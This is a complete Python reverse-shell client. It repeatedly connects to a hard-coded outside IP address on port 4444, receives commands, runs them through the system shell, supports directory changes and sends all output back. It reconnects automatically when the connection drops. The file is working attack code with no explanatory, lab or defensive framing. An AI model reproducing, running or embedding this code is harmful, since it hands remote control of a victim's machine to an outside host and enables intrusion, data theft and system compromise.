import socket
import subprocess
import os
import time

SERVER_IP = "45.79.93.184"
SERVER_PORT = 4444
TIMEOUT_DURATION = 30  # Increased timeout duration

def connect_to_server():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((SERVER_IP, SERVER_PORT))
            s.settimeout(TIMEOUT_DURATION)
            return s
        except socket.error:
            time.sleep(5)

def main():
    while True:
        s = connect_to_server()
        try:
            while True:
                command = s.recv(1024).decode()
                if not command:
                    break
                if command == "HEARTBEAT":
                    continue  # Ignore heartbeat messages
                if command.lower() == "exit":
                    s.close()
                    return
                elif command.startswith("cd "):
                    try:
                        os.chdir(command[3:])
                        s.send(b"Changed directory to " + os.getcwd().encode() + b"\n")
                    except Exception as e:
                        s.send(str(e).encode() + b"\n")
                else:
                    try:
                        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        stdout_value = proc.stdout.read() + proc.stderr.read()
                        s.send(stdout_value)
                    except Exception as e:
                        s.send(str(e).encode() + b"\n")
        except (ConnectionResetError, BrokenPipeError, socket.timeout):
            s.close()
            time.sleep(5)
        except Exception:
            s.close()
            time.sleep(5)

if __name__ == "__main__":
    main()
